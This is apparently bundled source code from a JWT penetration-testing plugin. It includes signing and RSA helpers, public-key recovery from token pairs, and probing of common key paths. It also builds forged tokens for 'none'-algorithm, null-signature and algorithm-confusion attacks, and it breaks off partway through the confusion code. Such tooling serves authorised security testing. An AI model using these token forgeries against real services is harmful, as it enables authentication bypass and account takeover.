// packages/backend/src/index.ts
import { RequestSpec } from "caido:utils";

// packages/backend/src/crypto/jwt.ts
import { createHmac, createHash } from "crypto";
function b64urlEncode(data) {
  const bytes = typeof data === "string" ? Buffer.from(data, "utf8") : Buffer.from(data);
  return bytes.toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "");
}
function b64urlDecode(str) {
  const padded = str + "=".repeat((4 - str.length % 4) % 4);
  return Buffer.from(padded.replace(/-/g, "+").replace(/_/g, "/"), "base64");
}
function parseJWT(token) {
  const parts = token.split(".");
  if (parts.length < 2) throw new Error("Invalid JWT: must have at least 2 parts");
  const [headerB64, payloadB64, signatureB64 = ""] = parts;
  let header;
  let payload;
  try {
    header = JSON.parse(b64urlDecode(headerB64).toString("utf8"));
  } catch {
    throw new Error("Invalid JWT: malformed header");
  }
  try {
    payload = JSON.parse(b64urlDecode(payloadB64).toString("utf8"));
  } catch {
    throw new Error("Invalid JWT: malformed payload");
  }
  return { headerB64, payloadB64, signatureB64, header, payload };
}
function encodeUnsigned(header, payload) {
  return `${b64urlEncode(JSON.stringify(header))}.${b64urlEncode(JSON.stringify(payload))}`;
}
function buildJWT(header, payload, signature) {
  return `${b64urlEncode(JSON.stringify(header))}.${b64urlEncode(JSON.stringify(payload))}.${signature}`;
}
function signHMAC(header, payload, secret, alg) {
  const hashMap = { HS256: "sha256", HS384: "sha384", HS512: "sha512" };
  const signingInput = encodeUnsigned(header, payload);
  const hmac = createHmac(hashMap[alg], secret);
  hmac.update(signingInput);
  const sig = b64urlEncode(hmac.digest());
  return `${signingInput}.${sig}`;
}
function signHMACRaw(signingInput, secret, alg) {
  const hashMap = { HS256: "sha256", HS384: "sha384", HS512: "sha512" };
  const hmac = createHmac(hashMap[alg], secret);
  hmac.update(signingInput);
  return `${signingInput}.${b64urlEncode(hmac.digest())}`;
}
var DIGEST_INFO = {
  sha256: "3031300d060960864801650304020105000420",
  sha384: "3041300d060960864801650304020205000430",
  sha512: "3051300d060960864801650304020305000440"
};
function derReadLen(buf, off) {
  const b = buf[off];
  if (b < 128) return { len: b, next: off + 1 };
  const nb = b & 127;
  let len = 0;
  for (let i = 0; i < nb; i++) len = len << 8 | buf[off + 1 + i];
  return { len, next: off + 1 + nb };
}
function derSkip(buf, off) {
  off++;
  const { len, next } = derReadLen(buf, off);
  return next + len;
}
function derReadBigInt(buf, off) {
  if (buf[off] !== 2) throw new Error(`Expected INTEGER at ${off}`);
  off++;
  const { len, next } = derReadLen(buf, off);
  const hex = buf.slice(next, next + len).toString("hex");
  return { value: hex ? BigInt("0x" + hex) : 0n, next: next + len };
}
function parsePKCS8RSAKey(pem) {
  const b64 = pem.replace(/-----[^-]+-----/g, "").replace(/\s/g, "");
  const der = Buffer.from(b64, "base64");
  let off = 0;
  if (der[off] !== 48) throw new Error("Not a PKCS8 key");
  off++;
  const { next: outerBody } = derReadLen(der, off);
  off = outerBody;
  off = derSkip(der, off);
  off = derSkip(der, off);
  if (der[off] !== 4) throw new Error("Expected OCTET STRING");
  off++;
  const { next: octBody } = derReadLen(der, off);
  off = octBody;
  if (der[off] !== 48) throw new Error("Expected RSAPrivateKey SEQUENCE");
  off++;
  const { next: rsaBody } = derReadLen(der, off);
  off = rsaBody;
  off = derSkip(der, off);
  const { value: n, next: afterN } = derReadBigInt(der, off);
  off = afterN;
  off = derSkip(der, off);
  const { value: d } = derReadBigInt(der, off);
  return { n, d };
}
function modpow(base, exp, mod) {
  if (mod === 1n) return 0n;
  let result = 1n;
  base = base % mod;
  while (exp > 0n) {
    if (exp & 1n) result = result * base % mod;
    exp >>= 1n;
    base = base * base % mod;
  }
  return result;
}
function emsaPKCS1(hash, hashAlg, keyLen) {
  const di = Buffer.from(DIGEST_INFO[hashAlg], "hex");
  const psLen = keyLen - 3 - di.length - hash.length;
  if (psLen < 8) throw new Error("Key too short for this hash algorithm");
  const em = Buffer.alloc(keyLen);
  let off = 0;
  em[off++] = 0;
  em[off++] = 1;
  em.fill(255, off, off + psLen);
  off += psLen;
  em[off++] = 0;
  di.copy(em, off);
  off += di.length;
  hash.copy(em, off);
  return em;
}
function signRSA(header, payload, privateKeyPem, alg) {
  if (alg.startsWith("PS")) {
    throw new Error("RSA-PSS signing not supported in this runtime");
  }
  const hashMap = {
    RS256: "sha256",
    RS384: "sha384",
    RS512: "sha512"
  };
  const hashAlg = hashMap[alg];
  if (!hashAlg) throw new Error(`Unsupported RSA algorithm: ${alg}`);
  const signingInput = encodeUnsigned(header, payload);
  const { n, d } = parsePKCS8RSAKey(privateKeyPem);
  const keyLen = Math.ceil(n.toString(2).length / 8);
  const hash = createHash(hashAlg).update(signingInput).digest();
  const em = emsaPKCS1(hash, hashAlg, keyLen);
  const m = BigInt("0x" + em.toString("hex"));
  const s = modpow(m, d, n);
  const sHex = s.toString(16).padStart(keyLen * 2, "0");
  const sBuf = Buffer.from(sHex, "hex");
  return `${signingInput}.${b64urlEncode(sBuf)}`;
}
function verifyHMAC(token, secret, alg) {
  const parts = token.split(".");
  if (parts.length !== 3) return false;
  const hashMap = { HS256: "sha256", HS384: "sha384", HS512: "sha512" };
  const signingInput = `${parts[0]}.${parts[1]}`;
  const hmac = createHmac(hashMap[alg], secret);
  hmac.update(signingInput);
  const expected = b64urlEncode(hmac.digest());
  return expected === parts[2];
}
function getAlgorithmFamily(alg) {
  if (alg.toLowerCase() === "none") return "none";
  if (alg.startsWith("HS")) return "HS";
  if (alg.startsWith("RS")) return "RS";
  if (alg.startsWith("ES")) return "ES";
  if (alg.startsWith("PS")) return "PS";
  return "unknown";
}

// packages/backend/src/crypto/rsa.ts
import { randomBytes } from "crypto";
var SMALL_PRIMES_GEN = (() => {
  const out = [];
  const limit = 2e3;
  const sieve = new Uint8Array(limit + 1);
  for (let i = 2; i <= limit; i++) {
    if (!sieve[i]) {
      out.push(BigInt(i));
      for (let j = i * i; j <= limit; j += i) sieve[j] = 1;
    }
  }
  return out;
})();
function bytesToBigInt(buf) {
  return buf.length ? BigInt("0x" + buf.toString("hex")) : 0n;
}
function modpowBig(base, exp, mod) {
  if (mod === 1n) return 0n;
  let result = 1n;
  base %= mod;
  while (exp > 0n) {
    if (exp & 1n) result = result * base % mod;
    exp >>= 1n;
    base = base * base % mod;
  }
  return result;
}
function gcdBig(a, b) {
  while (b) [a, b] = [b, a % b];
  return a < 0n ? -a : a;
}
function egcd(a, b) {
  if (b === 0n) return [a, 1n, 0n];
  const [g, x, y] = egcd(b, a % b);
  return [g, y, x - a / b * y];
}
function modinv(a, m) {
  const [g, x] = egcd((a % m + m) % m, m);
  if (g !== 1n) throw new Error("modular inverse does not exist");
  return (x % m + m) % m;
}
function randomBigIntOfBits(bits) {
  const bytes = Math.ceil(bits / 8);
  let n = bytesToBigInt(randomBytes(bytes));
  const mask = (1n << BigInt(bits)) - 1n;
  n &= mask;
  n |= 1n << BigInt(bits - 1);
  n |= 1n << BigInt(bits - 2);
  n |= 1n;
  return n;
}
function isProbablePrime(n, rounds = 16) {
  if (n < 2n) return false;
  for (const p of SMALL_PRIMES_GEN) {
    if (n === p) return true;
    if (n % p === 0n) return false;
  }
  let d = n - 1n;
  let r = 0n;
  while ((d & 1n) === 0n) {
    d >>= 1n;
    r++;
  }
  const witnesses = [2n, 3n, 5n, 7n, 11n, 13n, 17n, 19n, 23n, 29n, 31n, 37n];
  for (let i = 0; i < rounds; i++) {
    const a = witnesses[i % witnesses.length];
    if (a >= n - 1n) continue;
    let x = modpowBig(a, d, n);
    if (x === 1n || x === n - 1n) continue;
    let composite = true;
    for (let j = 1n; j < r; j++) {
      x = x * x % n;
      if (x === n - 1n) {
        composite = false;
        break;
      }
    }
    if (composite) return false;
  }
  return true;
}
function randomPrime(bits) {
  for (; ; ) {
    let cand = randomBigIntOfBits(bits);
    for (let k = 0; k < 4096; k++) {
      if (isProbablePrime(cand)) return cand;
      cand += 2n;
    }
  }
}
function unsignedBytes(n) {
  let hex = n.toString(16);
  if (hex.length % 2) hex = "0" + hex;
  return Buffer.from(hex, "hex");
}
function encodeUIntBig(n) {
  let buf = unsignedBytes(n);
  if (buf.length === 0) buf = Buffer.from([0]);
  if (buf[0] & 128) buf = Buffer.concat([Buffer.from([0]), buf]);
  return encodeInteger(buf);
}
function buildPKCS8RSAPem(n, e, d, p, q, dp, dq, qi) {
  const rsaPrivateKey = encodeSequence(Buffer.concat([
    encodeInteger(Buffer.from([0])),
    // version
    encodeUIntBig(n),
    encodeUIntBig(e),
    encodeUIntBig(d),
    encodeUIntBig(p),
    encodeUIntBig(q),
    encodeUIntBig(dp),
    encodeUIntBig(dq),
    encodeUIntBig(qi)
  ]));
  const algId = encodeSequence(Buffer.concat([
    Buffer.from("06092a864886f70d010101", "hex"),
    // OID rsaEncryption
    Buffer.from("0500", "hex")
    // NULL
  ]));
  const pkcs8 = encodeSequence(Buffer.concat([
    encodeInteger(Buffer.from([0])),
    // version
    algId,
    Buffer.concat([Buffer.from([4]), encodeLength(rsaPrivateKey.length), rsaPrivateKey])
    // OCTET STRING
  ]));
  const b64 = pkcs8.toString("base64");
  const lines = b64.match(/.{1,64}/g).join("\n");
  return `-----BEGIN PRIVATE KEY-----
${lines}
-----END PRIVATE KEY-----
`;
}
function generateRSAKeyPair(bits = 2048) {
  const e = 65537n;
  let p, q, n, d;
  for (; ; ) {
    p = randomPrime(bits / 2);
    q = randomPrime(bits / 2);
    if (p === q) continue;
    n = p * q;
    if (n.toString(2).length !== bits) continue;
    const phi = (p - 1n) * (q - 1n);
    if (gcdBig(e, phi) !== 1n) continue;
    d = modinv(e, phi);
    break;
  }
  if (p < q) [p, q] = [q, p];
  const dp = d % (p - 1n);
  const dq = d % (q - 1n);
  const qi = modinv(q, p);
  const privateKeyPem = buildPKCS8RSAPem(n, e, d, p, q, dp, dq, qi);
  const publicJwk = {
    kty: "RSA",
    n: b64urlEncode(unsignedBytes(n)),
    e: b64urlEncode(unsignedBytes(e))
  };
  const publicKeyPem = rsaJwkToSpkiPem(publicJwk);
  return { publicKeyPem, privateKeyPem, publicJwk };
}
function encodeLength(len) {
  if (len < 128) return Buffer.from([len]);
  if (len < 256) return Buffer.from([129, len]);
  return Buffer.from([130, len >> 8 & 255, len & 255]);
}
function encodeSequence(data) {
  return Buffer.concat([Buffer.from([48]), encodeLength(data.length), data]);
}
function encodeInteger(data) {
  return Buffer.concat([Buffer.from([2]), encodeLength(data.length), data]);
}
function encodeBitString(data) {
  const inner = Buffer.concat([Buffer.from([0]), data]);
  return Buffer.concat([Buffer.from([3]), encodeLength(inner.length), inner]);
}
function derReadLength(buf, offset) {
  const first = buf[offset];
  if (first < 128) return { len: first, next: offset + 1 };
  const nb = first & 127;
  let len = 0;
  for (let i = 0; i < nb; i++) len = len << 8 | buf[offset + 1 + i];
  return { len, next: offset + 1 + nb };
}
function derSkip2(buf, offset) {
  offset++;
  const { len, next } = derReadLength(buf, offset);
  return next + len;
}
function x509CertToPublicKeyPem(certPem) {
  const b64 = certPem.replace(/-----[^-]+-----/g, "").replace(/\s/g, "");
  const der = Buffer.from(b64, "base64");
  let offset = 0;
  if (der[offset] !== 48) throw new Error("Not a certificate SEQUENCE");
  offset++;
  const { next: tbsStart } = derReadLength(der, offset);
  offset = tbsStart;
  if (der[offset] !== 48) throw new Error("TBSCertificate not a SEQUENCE");
  offset++;
  const { next: tbsBodyStart } = derReadLength(der, offset);
  offset = tbsBodyStart;
  if (der[offset] === 160) offset = derSkip2(der, offset);
  offset = derSkip2(der, offset);
  offset = derSkip2(der, offset);
  offset = derSkip2(der, offset);
  offset = derSkip2(der, offset);
  offset = derSkip2(der, offset);
  if (der[offset] !== 48) throw new Error("SPKI not found in certificate");
  const spkiStart = offset;
  offset++;
  const { len: spkiLen, next: spkiBodyStart } = derReadLength(der, offset);
  const spki = der.slice(spkiStart, spkiBodyStart + spkiLen);
  const pem64 = spki.toString("base64");
  const lines = pem64.match(/.{1,64}/g).join("\n");
  return `-----BEGIN PUBLIC KEY-----
${lines}
-----END PUBLIC KEY-----
`;
}
function publicKeyPemToRawBytes(keyPem) {
  const b64 = keyPem.replace(/-----[^-]+-----/g, "").replace(/\s/g, "");
  return Buffer.from(b64, "base64");
}
function jwkToPublicKeyPem(jwk) {
  if (jwk.kty === "RSA") {
    return rsaJwkToSpkiPem(jwk);
  }
  if (jwk.kty === "EC") {
    return ecJwkToSpkiPem(jwk);
  }
  throw new Error(`Unsupported JWK kty: ${jwk.kty}`);
}
function rsaJwkToSpkiPem(jwk) {
  if (!jwk.n || !jwk.e) throw new Error("RSA JWK missing n or e");
  const nBuf = b64urlDecode(jwk.n);
  const eBuf = b64urlDecode(jwk.e);
  const nDer = nBuf[0] & 128 ? Buffer.concat([Buffer.from([0]), nBuf]) : nBuf;
  const eDer = eBuf[0] & 128 ? Buffer.concat([Buffer.from([0]), eBuf]) : eBuf;
  const rsaKeySeq = encodeSequence(Buffer.concat([encodeInteger(nDer), encodeInteger(eDer)]));
  const algId = encodeSequence(Buffer.concat([
    Buffer.from("06092a864886f70d010101", "hex"),
    // OID rsaEncryption
    Buffer.from("0500", "hex")
    // NULL
  ]));
  const spki = encodeSequence(Buffer.concat([algId, encodeBitString(rsaKeySeq)]));
  const b64 = spki.toString("base64");
  const lines = b64.match(/.{1,64}/g).join("\n");
  return `-----BEGIN PUBLIC KEY-----
${lines}
-----END PUBLIC KEY-----
`;
}
function ecJwkToSpkiPem(jwk) {
  if (!jwk.x || !jwk.y || !jwk.crv) throw new Error("EC JWK missing x, y, or crv");
  const curveOids = {
    "P-256": "06082a8648ce3d030107",
    "P-384": "06052b81040022",
    "P-521": "06052b81040023"
  };
  const pointLens = { "P-256": 32, "P-384": 48, "P-521": 66 };
  const oidHex = curveOids[jwk.crv];
  if (!oidHex) throw new Error(`Unsupported EC curve: ${jwk.crv}`);
  const xBuf = b64urlDecode(jwk.x);
  const yBuf = b64urlDecode(jwk.y);
  const coordLen = pointLens[jwk.crv];
  const xPadded = Buffer.alloc(coordLen);
  const yPadded = Buffer.alloc(coordLen);
  xBuf.copy(xPadded, coordLen - xBuf.length);
  yBuf.copy(yPadded, coordLen - yBuf.length);
  const point = Buffer.concat([Buffer.from([4]), xPadded, yPadded]);
  const ecPublicKeyOid = Buffer.from("06072a8648ce3d0201", "hex");
  const curveOid = Buffer.from(oidHex, "hex");
  const algId = encodeSequence(Buffer.concat([ecPublicKeyOid, curveOid]));
  const spki = encodeSequence(Buffer.concat([algId, encodeBitString(point)]));
  const b64 = spki.toString("base64");
  const lines = b64.match(/.{1,64}/g).join("\n");
  return `-----BEGIN PUBLIC KEY-----
${lines}
-----END PUBLIC KEY-----
`;
}
function publicKey2jwk(keyPem) {
  const b64 = keyPem.replace(/-----[^-]+-----/g, "").replace(/\s/g, "");
  const der = Buffer.from(b64, "base64");
  let offset = 0;
  if (der[offset] !== 48) throw new Error("Not a SPKI SEQUENCE");
  offset++;
  const { next: outerBody } = derReadLength(der, offset);
  offset = outerBody;
  offset = derSkip2(der, offset);
  if (der[offset] !== 3) throw new Error("Expected BIT STRING");
  offset++;
  const { next: bsBody } = derReadLength(der, offset);
  offset = bsBody + 1;
  if (der[offset] !== 48) throw new Error("Expected RSAPublicKey SEQUENCE");
  offset++;
  const { next: rsakBody } = derReadLength(der, offset);
  offset = rsakBody;
  if (der[offset] !== 2) throw new Error("Expected INTEGER for n");
  offset++;
  const { len: nLen, next: nBody } = derReadLength(der, offset);
  const nBuf = der.slice(nBody, nBody + nLen);
  offset = nBody + nLen;
  if (der[offset] !== 2) throw new Error("Expected INTEGER for e");
  offset++;
  const { len: eLen, next: eBody } = derReadLength(der, offset);
  const eBuf = der.slice(eBody, eBody + eLen);
  return {
    kty: "RSA",
    n: b64urlEncode(nBuf),
    e: b64urlEncode(eBuf)
  };
}
function jwksToPublicKeys(jwks) {
  const pems = [];
  for (const jwk of jwks.keys) {
    try {
      pems.push(jwkToPublicKeyPem(jwk));
    } catch {
    }
  }
  return pems;
}
function buildJWKSDocument(publicJwk, kid = "jwt-attacker-key") {
  return {
    keys: [{ ...publicJwk, use: "sig", kid, alg: "RS256" }]
  };
}

// packages/backend/src/crypto/keyRecovery.ts
import { createHash as createHash2 } from "crypto";
var DIGEST_INFO2 = {
  sha256: Buffer.from("3031300d060960864801650304020105000420", "hex"),
  sha384: Buffer.from("3041300d060960864801650304020205000430", "hex"),
  sha512: Buffer.from("3051300d060960864801650304020305000440", "hex")
};
var ALG_TO_HASH = {
  RS256: "sha256",
  RS384: "sha384",
  RS512: "sha512"
};
function gcd(a, b) {
  while (b !== 0n) {
    [a, b] = [b, a % b];
  }
  return a < 0n ? -a : a;
}
function buildEM(hash, hashAlg, keyLen) {
  const di = DIGEST_INFO2[hashAlg];
  if (!di) throw new Error(`No DigestInfo for ${hashAlg}`);
  const psLen = keyLen - 3 - di.length - hash.length;
  if (psLen < 8) throw new Error("Key too short for this hash algorithm");
  const em = Buffer.alloc(keyLen);
  let offset = 0;
  em[offset++] = 0;
  em[offset++] = 1;
  em.fill(255, offset, offset + psLen);
  offset += psLen;
  em[offset++] = 0;
  di.copy(em, offset);
  offset += di.length;
  hash.copy(em, offset);
  return BigInt("0x" + em.toString("hex"));
}
function bufferToBigint(buf) {
  if (buf.length === 0) return 0n;
  return BigInt("0x" + buf.toString("hex"));
}
function bigintToPublicKeyPem(n, e = 65537n) {
  const nHex = n.toString(16);
  const eHex = e.toString(16);
  const nBuf = Buffer.from(nHex.length % 2 ? "0" + nHex : nHex, "hex");
  const eBuf = Buffer.from(eHex.length % 2 ? "0" + eHex : eHex, "hex");
  const nDer = nBuf[0] & 128 ? Buffer.concat([Buffer.from([0]), nBuf]) : nBuf;
  const eDer = eBuf[0] & 128 ? Buffer.concat([Buffer.from([0]), eBuf]) : eBuf;
  const rsaKeySeq = encodeSequence(Buffer.concat([encodeInteger(nDer), encodeInteger(eDer)]));
  const algId = encodeSequence(Buffer.concat([
    Buffer.from("06092a864886f70d010101", "hex"),
    Buffer.from("0500", "hex")
  ]));
  const spki = encodeSequence(Buffer.concat([algId, encodeBitString(rsaKeySeq)]));
  const b64 = spki.toString("base64");
  const lines = b64.match(/.{1,64}/g).join("\n");
  return `-----BEGIN PUBLIC KEY-----
${lines}
-----END PUBLIC KEY-----
`;
}
var SMALL_PRIMES = [
  2n,
  3n,
  5n,
  7n,
  11n,
  13n,
  17n,
  19n,
  23n,
  29n,
  31n,
  37n,
  41n,
  43n,
  47n,
  53n,
  59n,
  61n,
  67n,
  71n,
  73n,
  79n,
  83n,
  89n,
  97n,
  101n,
  103n,
  107n,
  109n,
  113n,
  127n,
  131n,
  137n,
  139n,
  149n,
  151n,
  157n,
  163n,
  167n,
  173n,
  179n,
  181n,
  191n,
  193n,
  197n,
  199n,
  211n,
  223n,
  227n,
  229n,
  233n,
  239n,
  241n
];
function stripSmallFactors(n) {
  for (const p of SMALL_PRIMES) {
    while (n % p === 0n) n /= p;
  }
  return n;
}
async function recoverRSAPublicKey(jwt1, jwt2, onProgress) {
  const alg = jwt1.header.alg;
  if (!ALG_TO_HASH[alg]) throw new Error(`Unsupported algorithm: ${alg}`);
  const hashAlg = ALG_TO_HASH[alg];
  const sig1 = b64urlDecode(jwt1.signatureB64);
  const sig2 = b64urlDecode(jwt2.signatureB64);
  const keyLen = sig1.length;
  onProgress?.(`Signature length: ${keyLen * 8} bits, computing hashes\u2026`);
  const msg1 = `${jwt1.headerB64}.${jwt1.payloadB64}`;
  const msg2 = `${jwt2.headerB64}.${jwt2.payloadB64}`;
  const h1 = createHash2(hashAlg).update(msg1).digest();
  const h2 = createHash2(hashAlg).update(msg2).digest();
  const em1 = buildEM(h1, hashAlg, keyLen);
  const em2 = buildEM(h2, hashAlg, keyLen);
  const s1 = bufferToBigint(sig1);
  const s2 = bufferToBigint(sig2);
  onProgress?.(`Computing s1^e (this may take up to a minute)\u2026`);
  const e = 65537n;
  const s1e = s1 ** e;
  onProgress?.(`Computing s2^e\u2026`);
  const s2e = s2 ** e;
  onProgress?.(`Computing residuals and GCD\u2026`);
  const r1 = s1e - em1;
  const r2 = s2e - em2;
  let nCandidate = gcd(r1 < 0n ? -r1 : r1, r2 < 0n ? -r2 : r2);
  onProgress?.(`Raw GCD computed (${nCandidate.toString(16).length / 2} bytes), removing small factors\u2026`);
  nCandidate = stripSmallFactors(nCandidate);
  const bitLen = nCandidate.toString(2).length;
  if (bitLen < 512) throw new Error(`Recovered modulus too small (${bitLen} bits) \u2014 likely an incorrect pair`);
  onProgress?.(`Recovered ${bitLen}-bit modulus. Building public key\u2026`);
  const pem = bigintToPublicKeyPem(nCandidate);
  return { publicKeyPem: pem, modulusBits: bitLen };
}
async function recoverPublicKeyFromJWTs(jwts, onProgress) {
  const rsJwts = jwts.filter((j) => j.header.alg && ALG_TO_HASH[j.header.alg]);
  if (rsJwts.length < 2) {
    throw new Error("Need at least 2 RS-family JWTs with the same algorithm");
  }
  const byAlg = {};
  for (const jwt of rsJwts) {
    const alg = jwt.header.alg;
    (byAlg[alg] ??= []).push(jwt);
  }
  const results = [];
  const groups = Object.values(byAlg).filter((g) => g.length >= 2).sort((a, b) => b.length - a.length);
  if (groups.length) {
    const group = groups[0];
    const alg = group[0].header.alg;
    onProgress?.(`Attempting key recovery for ${alg} using 2 of ${group.length} JWTs\u2026`);
    try {
      results.push(await recoverRSAPublicKey(group[0], group[1], onProgress));
    } catch (err) {
      onProgress?.(`Recovery failed: ${err.message}`);
    }
  }
  return results;
}

// packages/backend/src/util.ts
import { randomBytes as randomBytes2 } from "crypto";
function nanoid(size = 12) {
  return randomBytes2(size).toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "").slice(0, size);
}
function parseCookies(cookieHeader) {
  const cookies = {};
  for (const pair of cookieHeader.split(";")) {
    const idx = pair.indexOf("=");
    if (idx === -1) continue;
    const key = pair.slice(0, idx).trim();
    const value = pair.slice(idx + 1).trim();
    cookies[key] = decodeURIComponent(value);
  }
  return cookies;
}
var JWT_REGEX = /^[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*$/;
function looksLikeJWT(value) {
  const trimmed = value.trim();
  if (!JWT_REGEX.test(trimmed)) return false;
  try {
    const parts = trimmed.split(".");
    const header = JSON.parse(Buffer.from(
      parts[0] + "=".repeat((4 - parts[0].length % 4) % 4),
      "base64"
    ).toString("utf8"));
    return typeof header.alg === "string";
  } catch {
    return false;
  }
}

// packages/backend/src/attacks/none.ts
var NONE_VARIANTS = ["none", "None", "NONE", "nOnE", "NoNe", "nONE", "NonE"];
function buildNoneAttacks(parsed) {
  const results = [];
  for (const alg of NONE_VARIANTS) {
    const header = { ...parsed.header, alg };
    results.push({
      id: nanoid(),
      technique: "none",
      techniqueName: `None Algorithm (alg="${alg}")`,
      description: `CVE-2015-9235: Sets alg to "${alg}" and strips the signature. Vulnerable servers accept unsigned tokens if they do not enforce signature presence.`,
      modifiedJWT: buildJWT(header, parsed.payload, ""),
      timestamp: Date.now()
    });
  }
  return results;
}

// packages/backend/src/attacks/nullSig.ts
function buildNullSigAttacks(parsed) {
  const signingInput = encodeUnsigned(parsed.header, parsed.payload);
  return [
    {
      id: nanoid(),
      technique: "nullSig",
      techniqueName: "Null Signature",
      description: "CVE-2020-28042: Retains the original algorithm but empties the signature. Vulnerable implementations skip signature verification when the signature field is empty.",
      modifiedJWT: `${signingInput}.`,
      timestamp: Date.now()
    }
  ];
}

// packages/backend/src/crypto/ecdsa.ts
function ecPublicKeyPemToRawBytes(keyPem) {
  return publicKeyPemToRawBytes(keyPem);
}

// packages/backend/src/types.ts
var COMMON_JWKS_PATHS = [
  "/.well-known/jwks.json",
  "/.well-known/openid-configuration",
  // parsed to follow its jwks_uri
  "/oauth/jwks",
  "/oauth2/jwks",
  "/oauth2/v1/keys",
  "/oauth2/v3/certs",
  "/v1/keys",
  "/v2/keys",
  "/.well-known/keys",
  "/auth/keys",
  "/auth/realms/master/protocol/openid-connect/certs",
  // Keycloak ({realm}=master)
  "/realms/master/protocol/openid-connect/certs",
  // Keycloak (newer layout)
  "/jwks",
  "/jwks.json",
  "/api/auth/jwks",
  "/api/jwks",
  "/api/v1/jwks",
  "/api/v2/jwks",
  "/.well-known/pki-validation/jwks.json",
  "/common/discovery/keys",
  // Azure AD
  "/discovery/v2.0/keys",
  // Azure AD
  "/oauth2/default/v1/keys",
  // Okta
  // Retained extras from prior list
  "/api/auth/keys",
  "/oauth/v2/keys",
  "/auth/jwks",
  "/.well-known/jwt-keys",
  "/api/v1/jwks.json",
  "/connect/jwks_uri"
];

// packages/backend/src/crypto/certFetch.ts
async function fetchTLSCertPem(_host, _port = 443) {
  throw new Error("TLS certificate fetching not available in this runtime");
}
async function fetchJWKS(fetcher, url) {
  try {
    const body = await fetcher(url);
    const parsed = JSON.parse(body);
    if (Array.isArray(parsed.keys)) return parsed;
    return null;
  } catch {
    return null;
  }
}
async function fetchOpenIDConfig(fetcher, issuerUrl) {
  try {
    const configUrl = `${issuerUrl.replace(/\/$/, "")}/.well-known/openid-configuration`;
    const body = await fetcher(configUrl);
    const config = JSON.parse(body);
    return config.jwks_uri ?? null;
  } catch {
    return null;
  }
}
var COMMON_CERT_PATHS = [
  "/cert.pem",
  "/certificate.pem",
  "/cert.crt",
  "/certificate.crt",
  "/server.pem",
  "/server.crt",
  "/tls.crt",
  "/ssl/cert.pem",
  "/ssl.crt",
  "/public.pem",
  "/public_key.pem",
  "/publickey.pem",
  "/pubkey.pem",
  "/public.crt",
  "/rsa.pub",
  "/key.pub",
  "/id_rsa.pub",
  "/jwt.pem",
  "/jwt.key.pub",
  "/jwtRS256.key.pub",
  "/jwt_public.pem",
  "/.well-known/cert.pem",
  "/.well-known/public.pem",
  "/static/cert.pem",
  "/keys/public.pem",
  "/keys/cert.pem"
];
function pkcs1ToSpkiPem(pkcs1Der) {
  const algId = encodeSequence(Buffer.concat([
    Buffer.from("06092a864886f70d010101", "hex"),
    // OID rsaEncryption
    Buffer.from("0500", "hex")
    // NULL
  ]));
  const spki = encodeSequence(Buffer.concat([algId, encodeBitString(pkcs1Der)]));
  const b64 = spki.toString("base64");
  const lines = b64.match(/.{1,64}/g).join("\n");
  return `-----BEGIN PUBLIC KEY-----
${lines}
-----END PUBLIC KEY-----
`;
}
function extractPublicKeyPem(body) {
  if (body.includes("-----BEGIN CERTIFICATE-----")) {
    try {
      return { pem: x509CertToPublicKeyPem(body), kind: "certificate" };
    } catch {
      return null;
    }
  }
  if (body.includes("-----BEGIN PUBLIC KEY-----")) {
    return { pem: body, kind: "public-key" };
  }
  if (body.includes("-----BEGIN RSA PUBLIC KEY-----")) {
    try {
      const b64 = body.replace(/-----[^-]+-----/g, "").replace(/\s/g, "");
      return { pem: pkcs1ToSpkiPem(Buffer.from(b64, "base64")), kind: "public-key" };
    } catch {
      return null;
    }
  }
  return null;
}
async function discoverPublicKeys(fetcher, baseUrl, extraPaths = []) {
  let origin;
  try {
    const parsed = new URL(baseUrl);
    origin = `${parsed.protocol}//${parsed.host}`;
  } catch {
    return [];
  }
  const paths = [...COMMON_CERT_PATHS, ...extraPaths];
  const found = [];
  for (let i = 0; i < paths.length; i += 5) {
    const batch = paths.slice(i, i + 5);
    const settled = await Promise.allSettled(
      batch.map(async (path) => {
        const url = `${origin}${path}`;
        const body = await fetcher(url);
        const extracted = extractPublicKeyPem(body);
        if (!extracted) return null;
        return { url, publicKeyPem: extracted.pem, kind: extracted.kind, content: body };
      })
    );
    for (const r of settled) {
      if (r.status === "fulfilled" && r.value) found.push(r.value);
    }
  }
  return found;
}
async function tryJwks(fetcher, url) {
  try {
    const body = await fetcher(url);
    const parsed = JSON.parse(body);
    if (Array.isArray(parsed.keys) && parsed.keys.length > 0) {
      return { url, keys: parsed.keys, content: body };
    }
  } catch {
  }
  return null;
}
async function discoverJWKS(fetcher, baseUrl, extraPaths = []) {
  let origin;
  try {
    const parsed = new URL(baseUrl);
    origin = `${parsed.protocol}//${parsed.host}`;
  } catch {
    return [];
  }
  const pathsToTry = [...COMMON_JWKS_PATHS, ...extraPaths];
  const results = [];
  const seenUrls = /* @__PURE__ */ new Set();
  try {
    const jwksUri = await fetchOpenIDConfig(fetcher, origin);
    if (jwksUri && !seenUrls.has(jwksUri)) {
      const jwks = await tryJwks(fetcher, jwksUri);
      if (jwks) {
        seenUrls.add(jwksUri);
        results.push(jwks);
      }
    }
  } catch {
  }
  for (let i = 0; i < pathsToTry.length; i += 5) {
    const batch = pathsToTry.slice(i, i + 5);
    const settled = await Promise.allSettled(
      batch.map((path) => tryJwks(fetcher, `${origin}${path}`))
    );
    for (const r of settled) {
      if (r.status === "fulfilled" && r.value && !seenUrls.has(r.value.url)) {
        seenUrls.add(r.value.url);
        results.push(r.value);
      }
    }
  }
  return results;
}

// packages/backend/src/attacks/algConfusion.ts
var ALG_CONFUSION_MAP = {
  RS256: "HS256",
  RS384: "HS384",
  RS512: "HS512",
  PS256: "HS256",
  PS384: "HS384",
  PS512: "HS512",
  ES256: "HS256",
  ES384: "HS384",
  ES512: "HS512"
};
function isAsymmetricAlg(alg) {
  return alg.startsWith("RS") || alg.startsWith("PS") || alg.startsWith("ES");
}
function secretVariants(keyPem, originalAlg) {
  const pem = keyPem.replace(/\r\n/g, "\n");
  const pemNoTrailingLF = pem.replace(/\n+$/, "");
  const pemBase64 = Buffer.from(pem, "utf8").toString("base64");
  const variants = [
    // Primary: the PEM string exactly as a typical key file / JWK→PEM export
    // (64-char wrapped, trailing newline). This is the net result of the
    // "base64-encode the PEM into a symmetric JWK `k`, then sign" workflow,
    // because `k` is base64-decoded back to the PEM before HMAC.
    { secret: Buffer.from(pem, "utf8"), label: "PEM" },
